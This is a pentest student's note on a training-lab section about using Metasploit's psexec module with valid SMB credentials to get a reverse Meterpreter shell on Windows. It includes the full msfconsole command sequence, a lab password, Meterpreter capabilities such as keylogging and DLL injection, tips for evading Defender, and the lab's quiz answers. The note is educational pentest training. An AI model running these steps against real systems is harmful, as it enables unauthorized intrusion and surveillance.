# NOTE — Automating Payloads & Delivery with Metasploit

## ID
107

## Module
Shells & Payloads

## Kind
notes

## Title
Section 7 — Automating Payloads & Delivery with Metasploit

## Description
Use Metasploit's pre-built exploit modules to automate the discovery → exploit → payload → shell chain. Walkthrough uses the classic `windows/smb/psexec` module with valid credentials to drop a Meterpreter session.

## Tags
metasploit, msfconsole, psexec, smb, meterpreter, exploit-modules

## Commands
- `sudo msfconsole` — launch MSF console
- `search smb` — find modules by keyword
- `use <module-number>` or `use exploit/windows/smb/psexec` — select module
- `options` / `show options` — list module options
- `set RHOSTS <ip>` — target host
- `set LHOST <ip>` — attacker callback IP
- `set SMBUser <user>` / `set SMBPass <pass>` — auth creds
- `set SHARE ADMIN$` — admin share for psexec
- `exploit` (or `run`) — fire the exploit
- `shell` — inside Meterpreter, drop to system cmd shell

## What This Section Covers
Metasploit Framework packages exploits + payloads + delivery into reusable modules. You enumerate the target, pick a matching module, fill in options, and `exploit`. Default payload is `windows/meterpreter/reverse_tcp` — Meterpreter is much more capable than a raw TCP shell (file ops, keylogging, process control, in-memory DLL injection).

## Meterpreter — Why You Want It
| Capability | Raw nc shell | Meterpreter |
|------------|--------------|-------------|
| File upload/download | Painful | Built-in |
| Process listing/kill | Manual | `ps` / `kill` |
| Keylog | No | `keyscan_start` |
| Service control | Manual | Built-in |
| In-memory (no disk) | No | Yes — DLL injection |
| Pivot/route | No | `route add` |

## Workflow — psexec Walkthrough
1. **Recon** — `nmap -sC -sV -Pn <ip>` to confirm SMB (445) is open and OS is Windows.
2. **Search** — `search smb` → find `exploit/windows/smb/psexec`.
3. **Select** — `use exploit/windows/smb/psexec`. Default payload auto-sets to `windows/meterpreter/reverse_tcp`.
4. **Configure**:
   ```
   set RHOSTS <target>
   set SHARE ADMIN$
   set SMBUser htb-student
   set SMBPass HTB_@cademy_stdnt!
   set LHOST <attacker-ip>
   ```
5. **Run** — `exploit`. MSF authenticates, uploads payload to `ADMIN$`, executes via service, returns Meterpreter session.
6. **Interact** — `meterpreter >` prompt. Use `?` for commands. `shell` drops to underlying system shell.

## Decoding Module Names
`exploit/windows/smb/psexec`:
| Segment | Meaning |
|---------|---------|
| `exploit/` | Module type (also: auxiliary, post, encoder, nop) |
| `windows/` | Target platform |
| `smb/` | Service / attack vector |
| `psexec` | Specific technique (admin-share + service creation) |

## Interactive Shell Inside Meterpreter
```shellsession
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — What command-language interpreter is used to establish the system shell? | **PowerShell** | Module output reads `Selecting PowerShell target` during exploit chain. |
| Q2 — Filename in htb-student's Documents folder | **staffsalaries.txt** | After Meterpreter session: `ls C:/Users/htb-student/Documents/` → lists `staffsalaries.txt`. |

## Key Takeaways
- MSF psexec needs valid credentials — it's not a vuln exploit, it's authenticated lateral movement (like SysInternals psexec).
- The module's relative number from `search` is not stable — names are.
- Meterpreter ≠ shell — use `shell` to drop to cmd/PowerShell when you need full OS commands.
- Some training programs limit MSF use; CPTS doesn't — but understand what each module does before relying on it.

## Gotchas
- `LHOST` must be reachable from the *target*, not from where MSF runs. On VPN tunnels, set to the tunnel IP.
- `ADMIN$` share requires admin credentials — won't work with a regular domain user.
- If Defender is on, the staged payload may get caught — try a different payload (e.g. `windows/x64/meterpreter/reverse_https`) or stageless.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|shells-payloads]]
← [[06-introduction-to-payloads]] | [[08-crafting-payloads-msfvenom]] →
<!-- AUTO-LINKS-END -->
